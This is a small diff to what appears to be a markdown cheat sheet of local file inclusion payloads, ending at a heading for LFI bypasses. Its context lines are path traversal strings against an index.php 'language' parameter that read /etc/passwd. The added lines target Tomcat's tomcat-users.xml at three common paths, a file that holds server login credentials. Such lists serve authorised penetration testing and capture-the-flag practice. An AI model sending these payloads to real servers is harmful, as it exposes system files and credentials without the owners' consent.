@@ -7,6 +7,9 @@
 /index.php?language=../../../../etc/passwd
 /index.php?language=/../../../etc/passwd
 /index.php?language=./languages/../../../../etc/passwd
+/index.php?language=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+/index.php?language=../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
+/index.php?language=../../../../../../etc/tomcat9/tomcat-users.xml
 ```
 
 ### LFI Bypasses
